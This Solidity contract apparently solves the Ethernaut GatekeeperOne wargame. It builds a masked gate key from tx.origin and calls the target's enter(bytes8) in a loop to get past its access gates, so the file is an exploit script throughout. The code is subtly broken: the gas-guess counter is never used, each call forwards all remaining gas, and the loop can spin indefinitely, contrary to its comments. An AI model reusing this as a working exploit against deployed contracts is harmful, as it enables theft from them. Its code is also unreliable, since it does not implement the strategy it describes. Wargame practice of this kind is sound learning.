// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract GatekeeperOneAttack2 {


    constructor(address viticm){
      attack(viticm);
    }


    function attack(address viticm) internal{

        /**
            Hack the gateThree(bytes8 _gateKey). 
            1. Firstly it was based on the tx.original and above params's type is bytes8. So the answer can be come from:bytes8(uint64(uint160(tx.origin)))
              The result as this: 0x3fcb875f56beddc4, which truncate the right bits to matain the left most 64 bits.

            2. To satisfy the `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)` or `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)`, should let the bits between
            16th bit and 32th bit from left to right are zero. like this 0x3fcb875f0000ddc4
            To get the value, bitwise and these two number:0x3fcb875f56beddc4 0xffffffff0000ffff
        
         */

        bytes8 gateKey = bytes8(uint64(uint160(msg.sender)));

        bytes8 markValue = bytes8(0xffffffff0000ffff);

        bytes8 gateKeyValue;
        assembly {
             gateKeyValue:= and(gateKey,markValue)
        }
        
        // Hack gateTwo
        // Guess the gas, the call will at least consume the minal gas is 100, just add 50 to try.
        uint256 guessGas = 8191+150;
        bool returnFalse;
        while(!returnFalse){
          (returnFalse, ) = viticm.call{gas:gasleft()}(abi.encodeWithSignature("enter(bytes8)", gateKeyValue));
          --guessGas;
        }

        // Hack gateOne, just make this contract to call
        
    }
 
}
